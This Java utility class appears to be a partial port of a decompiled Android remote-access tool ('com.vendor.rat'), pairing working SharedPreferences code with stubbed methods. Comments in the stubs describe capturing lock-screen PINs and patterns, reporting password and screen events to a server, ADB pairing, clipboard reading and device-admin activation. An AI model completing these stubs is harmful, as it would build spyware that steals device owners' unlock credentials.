package com.vendor.rat.utils;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.UserManager;
import android.util.Log;

/**
 * Vendor: com.guard.wallet.utils.h (SharedPreferences + message portion)
 * Provides SharedPreferences read/write, message sending, ADB config,
 * and lock cipher management utilities.
 */
public abstract class SharedUtils {

    private static final String TAG = "SharedUtils";
    private static final String PREFS_NAME = "vendor_rat_prefs";
    private static Context appContext;

    /**
     * Initialize SharedUtils with application context.
     * Must be called once from Application.onCreate().
     */
    public static void init(Context context) {
        if (context != null) {
            appContext = context.getApplicationContext();
        }
    }

 private static SharedPreferences getPrefs() {
        if (appContext == null) {
        return null;
     }
   return appContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
    }

    /**
     * Expose the SharedPreferences instance for callers that need to perform
     * multi-key atomic edits via a single Editor.commit() call.
  * Returns null if not yet initialized.
     */
    public static SharedPreferences getPrefsInstance() {
        return getPrefs();
    }

 // ========== SharedPreferences Core Read/Write ==========

    /**
     * Save value to SharedPreferences. Vendor: h.D()
     * Supports Integer, String, Float, Long, Boolean.
     */
    public static synchronized boolean save(Object value, String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || value == null) {
                return false;
            }
            if (!isUserUnlocked()) {
                return false;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return false;
                }
                SharedPreferences.Editor editor = prefs.edit();
                if (value instanceof String) {
                    editor.putString(key, (String) value);
                } else if (value instanceof Boolean) {
                    editor.putBoolean(key, (Boolean) value);
                } else if (value instanceof Integer) {
                    editor.putInt(key, (Integer) value);
                } else if (value instanceof Long) {
                    editor.putLong(key, (Long) value);
                } else if (value instanceof Float) {
                    editor.putFloat(key, (Float) value);
                } else {
                    Log.w(TAG, "save: unsupported type " + value.getClass().getSimpleName());
                    return false;
                }
                editor.apply();
                Log.d(TAG, "save key=" + key + " type=" + value.getClass().getSimpleName());
                return true;
            } catch (Exception e) {
                Log.e(TAG, "save error", e);
            }
            return false;
        }
    }

    /**
     * Get boolean from SharedPreferences. Vendor: h.e()
     */
    public static synchronized boolean getBoolean(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return false;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return false;
                }
                return prefs.getBoolean(key, false);
            } catch (Exception e) {
                Log.e(TAG, "getBoolean error", e);
            }
            return false;
        }
    }

    /**
     * Get float from SharedPreferences. Vendor: h.h()
     */
    public static synchronized float getFloat(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return 0.0f;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return 0.0f;
                }
                return prefs.getFloat(key, 0.0f);
            } catch (Exception e) {
                Log.e(TAG, "getFloat error", e);
            }
            return 0.0f;
        }
    }

    /**
     * Get int from SharedPreferences. Vendor: h.i()
     */
    public static synchronized int getInt(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return 0;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return 0;
                }
                return prefs.getInt(key, 0);
            } catch (Exception e) {
                Log.e(TAG, "getInt error", e);
            }
            return 0;
        }
    }

    /**
     * Get long from SharedPreferences. Vendor: h.j()
     */
    public static synchronized long getLong(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return 0L;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return 0L;
                }
                return prefs.getLong(key, 0L);
            } catch (Exception e) {
                Log.e(TAG, "getLong error", e);
            }
            return 0L;
        }
    }

    /**
     * Get string from SharedPreferences. Vendor: h.l()
     */
    public static synchronized String getString(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return null;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return null;
                }
                return prefs.getString(key, null);
            } catch (Exception e) {
                Log.e(TAG, "getString error", e);
            }
            return null;
        }
    }

    /**
     * Remove key from SharedPreferences. Vendor: h.w()
     */
    public static synchronized void remove(String key) {
        synchronized (SharedUtils.class) {
            if (key == null || key.isEmpty() || !isUserUnlocked()) {
                return;
            }
            try {
                SharedPreferences prefs = getPrefs();
                if (prefs == null) {
                    return;
                }
                prefs.edit().remove(key).apply();
                Log.d(TAG, "remove key=" + key);
            } catch (Exception e) {
                Log.e(TAG, "remove error", e);
            }
        }
    }

    /**
     * Check if user storage is unlocked (direct boot aware). Vendor: h.s()
     */
    public static synchronized boolean isUserUnlocked() {
        // ADAPT: vendor checks g.Z() context and UserManager.isUserUnlocked()
        // TODO: VENDOR_VERIFY - context provider
        return true;
    }

    // ========== Message Sending ==========

    /**
     * Send network state change message. Vendor: h.F()
     */
    public static void sendNetStateMessage() {
        // ADAPT: vendor creates MessageRecordVO with CONNECTIVITY_CHANGE intent
        // and forwards via MainApplication handler
        Log.d(TAG, "sendNetStateMessage");
    }

    /**
     * Send password event message. Vendor: h.G()
     */
    public static void sendPasswordEvent(String intentCode) {
        if (intentCode == null || intentCode.isEmpty()) {
            return;
        }
        // ADAPT: vendor reads lockBatchId from SharedPreferences
        // Creates MessageRecordVO with PasswordEventBodyVO
        // Sends via v() or queues via handler
        Log.d(TAG, "sendPasswordEvent: " + intentCode);
    }

    /**
     * Send screen event stat message. Vendor: h.H()
     */
    public static void sendScreenEvent(int state, String intentCode) {
        Log.d("MessageUtils", "需要向服务器提交屏幕事件:" + state);
        // ADAPT: vendor creates ScreenEventStatVO with keyguard state
        // and sends via MessageRecordVO
    }

    /**
     * Send screen size message. Vendor: h.I()
     */
    public static void sendScreenSizeMessage() {
        try {
            // ADAPT: vendor creates MessageRecordVO with SCREEN_SIZE intent
            // and ScreenMetricsVO from utils.e.e()
            Log.d("MessageUtils", "sendScreenSizeMessage");
        } catch (Exception e) {
            Log.e("MessageUtils", "sendScreenSizeMessage error", e);
        }
    }

    /**
     * Submit message to server synchronously. Vendor: h.v()
     */
    public static boolean submitMessage(Object messageRecord) {
        // ADAPT: vendor builds ApiRequest, sends via http.l.q()
        // Returns true if server confirms success
        return false;
    }

    // ========== Lock Cipher Management ==========

    /**
     * Process and save lock cipher data. Vendor: h.C()
     */
    public static void processLockCipher(Object reqUnlockDeviceVO) {
        if (reqUnlockDeviceVO == null) return;
        // ADAPT: vendor merges cipher data, saves to SharedPreferences
        // Syncs to local HTTP servers on ports 7911/7912
        Log.d(TAG, "processLockCipher");
    }

    /**
     * Save lock cipher directly. Vendor: h.K()
     */
    public static void saveLockCipher(Object reqUnlockDeviceVO) {
        if (reqUnlockDeviceVO == null) return;
        // ADAPT: vendor saves to deviceCipher or deviceCipherLocked
        Log.d(TAG, "saveLockCipher");
    }

    /**
     * Get saved device cipher (unlocked). Vendor: h.f()
     */
    public static Object getDeviceCipher() {
        String json = getString("deviceCipher");
        if (json == null || json.isEmpty()) return null;
        return GsonUtils.fromJsonString(json, Object.class);
    }

    /**
     * Get saved device cipher (locked). Vendor: h.g()
     */
    public static Object getDeviceCipherLocked() {
        String json = getString("deviceCipherLocked");
        if (json == null || json.isEmpty()) return null;
        return GsonUtils.fromJsonString(json, Object.class);
    }

    /**
     * Check if unlocked cipher is valid. Vendor: h.n()
     */
    public static boolean hasValidCipher() {
        return validateCipher(getDeviceCipher());
    }

    /**
     * Check if locked cipher is valid. Vendor: h.o()
     */
    public static boolean hasValidLockedCipher() {
        return validateCipher(getDeviceCipherLocked());
    }

    /**
     * Validate cipher data completeness. Vendor: h.t()
     */
    public static boolean validateCipher(Object reqUnlockDeviceVO) {
        // ADAPT: vendor checks cipherGradeCode and corresponding cipher fields
        // PASSWORD_QUALITY_TOUCH_POINTS -> touchCipher
        // PASSWORD_QUALITY_PATTERN -> patternCipher
        // others -> textCipher + cipherGradeCode
        return false;
    }

    // ========== ADB Config Management ==========

    /**
     * Update ADB config from remote. Vendor: h.A()
     */
    public static boolean updateAdbConfig(Object adbConfig) {
        // ADAPT: vendor merges ADB config fields and saves
        return false;
    }

    /**
     * Get ADB config from SharedPreferences. Vendor: h.J()
     */
    public static Object getAdbConfig() {
        // ADAPT: vendor reads ADBConfig from SharedPreferences
        // Creates default if not found
        return null;
    }

    /**
     * Get connected debug port. Vendor: h.a()
     */
    public static int getConnectedDebugPort() {
        return 0;
    }

    /**
     * Get debug port (connected or not). Vendor: h.b()
     */
    public static int getDebugPort() {
        return 0;
    }

    /**
     * Reset ADB connection state. Vendor: h.p()
     */
    public static void resetAdbState() {
        Log.d(TAG, "resetAdbState");
    }

    /**
     * Refresh ADB development settings. Vendor: h.Q()
     */
    public static void refreshAdbSettings() {
        Log.d(TAG, "refreshAdbSettings");
    }

    /**
     * Update ADB config from port check. Vendor: h.x()
     */
    public static void updateFromPortCheck(Object checkPortResult) {
        Log.d(TAG, "updateFromPortCheck");
    }

    /**
     * Update ADB config from pair response. Vendor: h.y()
     */
    public static void updateFromPairResponse(Object pairResponseVO) {
        Log.d(TAG, "updateFromPairResponse");
    }

    /**
     * Set RatHat installed state. Vendor: h.z()
     */
    public static void setRatHatInstalled(boolean installed) {
        Log.d(TAG, "setRatHatInstalled: " + installed);
    }

    // ========== Misc ==========

    /**
     * Set admin activating state. Vendor: h.B()
     */
    public static void setAdminActivating(boolean activating, boolean sync) {
        save(activating, "isAdminActivating");
        if (sync) {
            // ADAPT: vendor syncs to local HTTP server
            Log.d(TAG, "syncAdminActivating: " + activating);
        }
    }

    /**
     * Save and handle system language change. Vendor: h.E()
     */
    public static void updateSystemLanguage(String langCode) {
        if (langCode == null || langCode.isEmpty()) return;
        synchronized (SharedUtils.class) {
            String prev = getSystemLanguage();
            save(langCode, "systemLangCode");
            if (prev != null && !prev.equals(langCode)) {
                Log.d(TAG, "语言变更: " + prev + " -> " + langCode);
                // ADAPT: vendor resets text config and reloads
            }
        }
    }

    /**
     * Get saved system language code. Vendor: h.m()
     */
    public static String getSystemLanguage() {
        return getString("systemLangCode");
    }

    /**
     * Get clipboard text. Vendor: h.u()
     */
    public static String getClipboardText() {
        // ADAPT: vendor reads from ClipboardManager
        // TODO: VENDOR_VERIFY - context provider for clipboard
        return null;
    }

    /**
     * Check if first accessibility open. Vendor: h.q()
     */
    public static boolean isFirstAccessibilityConfigured() {
        return getBoolean("isFirstOpenAccessibility");
    }

    /**
     * Check power control state for package. Vendor: h.r()
     */
    public static boolean isPowerControlAllowed(String packageName) {
        if (packageName == null || packageName.isEmpty()) return false;
        // ADAPT: vendor reads PowerControlStateVO from SharedPreferences
        return false;
    }

    /**
     * Save power control state. Vendor: h.L()
     */
    public static void savePowerControlState(Object powerControlStateVO) {
        // ADAPT: vendor saves and syncs to local HTTP + remote API
        Log.d(TAG, "savePowerControlState");
    }
}